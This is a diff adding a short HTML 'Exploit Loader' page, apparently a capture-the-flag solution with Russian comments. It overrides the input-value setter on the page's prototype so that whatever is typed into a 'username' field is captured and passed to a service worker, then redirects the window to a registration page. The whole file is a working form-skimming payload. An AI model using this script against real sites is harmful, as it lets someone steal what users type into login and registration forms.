@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Loader</title>
+</head>
+<body>
+    <h1>Poisoning prototype and redirecting...</h1>
+    <script>
+        // Ждем, пока Service Worker будет готов
+        navigator.serviceWorker.ready.then(reg => {
+            console.log('Service Worker is ready. Poisoning prototype...');
+
+            // Сохраняем оригинальное поведение
+            const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
+
+            // Загрязняем прототип
+            Object.defineProperty(HTMLInputElement.prototype, 'value', {
+                set: function(value) {
+                    // Ищем поле 'username'
+                    if (this.name === 'username' && navigator.serviceWorker.controller) {
+                        console.log(`FLAG CAPTURED: ${value}`);
+                        // Отправляем флаг в Service Worker
+                        navigator.serviceWorker.controller.postMessage(value);
+                    }
+                    // Вызываем оригинальный сеттер
+                    originalDescriptor.set.apply(this, arguments);
+                },
+                get: function() {
+                    return originalDescriptor.get.apply(this, arguments);
+                }
+            });
+
+            console.log('Prototype poisoned. Redirecting to target...');
+            // Теперь, когда все готово, перенаправляем ЭТО ОКНО на страницу регистрации
+            window.location.href = 'http://web/register';
+        });
+    </script>
+</body>
+</html>
